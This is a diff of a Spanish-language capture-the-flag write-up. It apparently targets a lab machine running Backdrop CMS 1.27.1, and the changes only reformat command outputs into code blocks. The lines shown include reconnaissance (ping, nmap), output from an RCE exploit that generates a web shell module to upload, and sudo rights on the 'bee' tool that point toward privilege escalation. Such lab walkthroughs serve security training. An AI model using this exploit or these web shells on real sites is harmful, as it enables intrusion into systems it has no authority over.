@@ -12,8 +12,9 @@ Primero, se hace *ping* para confirmar que la máquina está activa y verificar 
 ping 10.10.11.58
 ```
 **Salida (fragmento):**
-
+```bash
 PING 10.10.11.58 (10.10.11.58) 56(84) bytes of data. 64 bytes from 10.10.11.58: icmp_seq=1 ttl=63 time=39.9 ms 64 bytes from 10.10.11.58: icmp_seq=2 ttl=63 time=51.0 ms ...
+```
 
 Luego se realiza un escaneo con Nmap para identificar los puertos abiertos:
 
@@ -22,7 +23,11 @@ nmap -p- --min-rate=1000 -vvv -Pn 10.10.11.58
 ```
 **Salida (fragmento):**
 
-PORT STATE SERVICE 22/tcp open ssh syn-ack 80/tcp open http syn-ack
+```bash
+PORT STATE SERVICE 
+22/tcp open ssh syn-ack 
+80/tcp open http syn-ack
+```
 
 La máquina tiene abiertos los puertos **22 (SSH)** y **80 (HTTP)**.
 
@@ -59,7 +64,15 @@ python3 exploit.py 10.10.11.58
 ```
 **Salida (fragmento):**
 
-Backdrop CMS 1.27.1 - Remote Command Execution Exploit Evil module generating... Evil module generated! shell.zip Go to 10.10.11.58/admin/modules/install and upload the shell.zip for Manual Installation. Your shell address: 10.10.11.58/modules/shell/shell.php
+```bash
+Backdrop CMS 1.27.1 - Remote Command Execution Exploit Evil module generating... 
+
+Evil module generated! shell.zip 
+
+Go to 10.10.11.58/admin/modules/install and upload the shell.zip for Manual Installation. 
+
+Your shell address: 10.10.11.58/modules/shell/shell.php
+```
 
 Al darse cuenta de que la instalación no acepta archivos ZIP, se comprime el directorio que contiene el shell con:
   
@@ -95,9 +108,11 @@ sudo -l
 ```
 **Salida:**
 
+```bash
 Matching Defaults entries for johncusack on dog: env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
 
 User johncusack may run the following commands on dog: (ALL : ALL) /usr/local/bin/bee
+```
 
 El usuario **johncusack** puede ejecutar sin contraseña el comando **/usr/local/bin/bee**, una utilidad para controlar Backdrop desde línea de comandos (ver [Bee en Backdrop CMS](https://backdropcms.org/project/bee)).
 
